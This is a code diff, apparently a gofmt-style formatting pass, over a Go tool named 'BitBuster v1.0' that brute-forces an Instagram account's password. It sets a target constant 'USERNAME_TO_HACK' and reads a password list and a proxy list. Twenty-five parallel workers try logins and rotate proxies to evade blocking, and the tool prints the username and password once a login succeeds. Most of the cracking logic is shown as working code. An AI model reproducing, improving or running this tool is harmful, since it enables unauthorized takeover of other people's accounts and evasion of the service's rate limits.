@@ -1,20 +1,20 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
+	"net"
+	"os"
 	"strings"
 	"sync"
-	"os"
-	"bufio"
 	"time"
-	"net"
 
 	"github.com/ahmdrz/goinsta"
 )
 
-const username 	string = "USERNAME_TO_HACK"
-const WORKERS 	int = 25
-const VERBOSE 	bool = false
+const username string = "USERNAME_TO_HACK"
+const WORKERS int = 25
+const VERBOSE bool = false
 
 var wg sync.WaitGroup
 var hasProxyWarningOccurred bool = false
@@ -29,25 +29,25 @@ func main() {
 	welcomeMessage()
 
 	// Load passwords and proxies into memory
-  passwords, _ = readLines("passwords.txt")
-	proxies, 	 _ = readLines("proxies.txt")
+	passwords, _ = readLines("passwords.txt")
+	proxies, _ = readLines("proxies.txt")
 
 	// Print 'Initialized' banner
 	initializedMessage()
 
-  for len(passwords) > 0 && !cracked {
-    // Begin the cracking process
-    crack()
+	for len(passwords) > 0 && !cracked {
+		// Begin the cracking process
+		crack()
 
-  	// Wait for all goroutines to complete
-  	wg.Wait()
-  }
+		// Wait for all goroutines to complete
+		wg.Wait()
+	}
 
 	// Mission failed. We'll get em' next time!
 	failedMessage()
 }
 
-func welcomeMessage()  {
+func welcomeMessage() {
 	fmt.Println(`
 |------------------------------------------|
 |   BitBuster v1.0                         |
@@ -96,7 +96,7 @@ func printDots() {
 	fmt.Print(". ")
 }
 
-func crack()  {
+func crack() {
 	// Don't start more threads than one thread per password
 	activatedWorkers := WORKERS
 	if WORKERS > len(passwords) {
@@ -110,7 +110,7 @@ func crack()  {
 	go statusLoop()
 }
 
-func statusLoop()  {
+func statusLoop() {
 	for true {
 		time.Sleep(time.Second * 10)
 		fmt.Println()
@@ -144,15 +144,15 @@ func workerThread(workerNumber int) {
 		password := pop(&passwords)
 
 		// Test login informaton
-		result := login(username, password, "http://" + proxy, workerNumber)
+		result := login(username, password, "http://"+proxy, workerNumber)
 
 		if result == 0 {
 			/*
 			 *	Account cracked!
 			 */
 			fmt.Println("\n\nWorker #", workerNumber, "has cracked the account!")
-			fmt.Println("Username:", username + "\n" +
-									"Password:", password + "\n")
+			fmt.Println("Username:", username+"\n"+
+				"Password:", password+"\n")
 			os.Exit(0)
 		} else if result == 2 {
 			/*
@@ -172,7 +172,7 @@ func workerThread(workerNumber int) {
 					if VERBOSE {
 						fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
 					}
-					break;
+					break
 				}
 			}
 
@@ -180,7 +180,7 @@ func workerThread(workerNumber int) {
 				if VERBOSE {
 					fmt.Println("Worker #", workerNumber, "is terminating prematurely due to lack of proxies.")
 				}
-				break;
+				break
 			}
 
 			// Worker proxy switch message
@@ -218,7 +218,7 @@ func login(user string, pass string, proxy string, workerNumber int) int {
 
 	defer insta.Logout()
 
-  cracked = true
+	cracked = true
 	return 0
 }
 
@@ -231,36 +231,36 @@ func pop(slice *[]string) string {
 		hasProxyWarningOccurred = true
 		return ""
 	}
-	val := (*slice)[len(*slice) - 1]
-	*slice = (*slice)[:len(*slice) - 1]
+	val := (*slice)[len(*slice)-1]
+	*slice = (*slice)[:len(*slice)-1]
 	return val
 }
 
 // readLines() reads a whole file into memory
 // and returns a slice of its lines.
 func readLines(path string) ([]string, error) {
-  file, err := os.Open(path)
-  if err != nil {
-    return nil, err
-  }
-  defer file.Close()
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
 
-  var lines []string
-  scanner := bufio.NewScanner(file)
-  for scanner.Scan() {
-    lines = append(lines, scanner.Text())
-  }
-  return lines, scanner.Err()
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	return lines, scanner.Err()
 }
 
 // Checks if TCP conn. can be established to proxy
 func checkConn(proxy string) bool {
-  conn, err := net.Dial("tcp", proxy)
+	conn, err := net.Dial("tcp", proxy)
 
-  if err != nil {
+	if err != nil {
 		return false
-  } else {
+	} else {
 		defer conn.Close()
 		return true
-  }
+	}
 }
